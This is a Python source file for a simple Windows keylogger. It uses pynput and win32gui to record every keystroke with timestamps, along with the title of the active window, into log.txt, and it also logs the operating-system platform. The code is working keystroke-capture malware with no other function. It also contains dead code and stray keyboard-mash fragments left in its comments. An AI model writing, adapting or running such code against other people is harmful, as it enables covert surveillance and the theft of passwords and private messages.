import pynput
import ctypes
import sys
import win32gui
import datetime
import platform


from datetime import time
from datetime import date
from datetime import datetime


name_last_active_window = ""


from pynput.keyboard import Key, Listener


import logging
import sys

#logging.basicConfig(format='%(asctime)s %(levelname)s %(message)s',
                    #level=logging.DEBUG,
                    #stream=sys.stdout)


def get_active_window():
    active_window_name = None
    import win32gui
    window = win32gui.GetForegroundWindow()
    active_window_name = win32gui.GetWindowText(window)
    return active_window_name


print("Active window: %s" % str(get_active_window()))

# keys = []


def on_press(key):
    # global keys
    # keys.append(key)
    print("{0} pressed".format(key))
    w = get_active_window()
    write_file(key, w)


def write_file(key, w):
    global name_last_active_window
    f = open("log.txt", "a")
    #f.write(datetime.datetime.now().ctime())
    #f.write("\n")
    #f.write("Operating system: ")
    #f.write(platform.platform())
    f.write("\n")
    #q = get_active_window()
    #i = 0
    #f.close()[poiugy
    #f.write("\n")hello
    active_window = str(get_active_window())
    if name_last_active_window != active_window:
        f.write("\n")
        f.write(f"Active window: {active_window}")
        f.write("\n")
    name_last_active_window = active_window

   # with open("log.txt", "a") as f:

    #for key in keys:


            #f.write(str(i))

            #f.write("\n")
            #w = get_active_window()u8y7tutdvghj
            #if w != q:
                #f.write("\n")
                #f.write("Active window: %s" % str(get_active_window()))
                #f.write("\n")
            #if (w != get_active_window()):hellog
                #get_active_window()pkojihuyg
                #f.write("Active window: %s" % str(get_active_window()))
                #f.write("\n\n")
    k = str(key).replace("'", "")
    #k = str(*keys)

    if k.find("space") > 0:
        now_time = datetime.now().time().replace(microsecond=0)
        time_format = "%H:%M:%S"
        f.write(str(now_time))
        f.write(' ')
        f.write('space pressed')
    elif k.find("Key") == -1:
        now_time = datetime.now().time().replace(microsecond=0)
        time_format = "%H:%M:%S"
        if k.find(' '):
            f.write(str(now_time))
        # f.write(' ')
            f.write(k)

    f.close()


def on_release(key):
    if key == Key.esc:
        return False


def main():
    f = open("log.txt", "w")
    now_data = datetime.now().date()
    f.write(str(now_data))
    f.write("\n")
    f.write("Operating system: ")
    f.write(platform.platform())


if __name__ == "__main__":
    main()


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()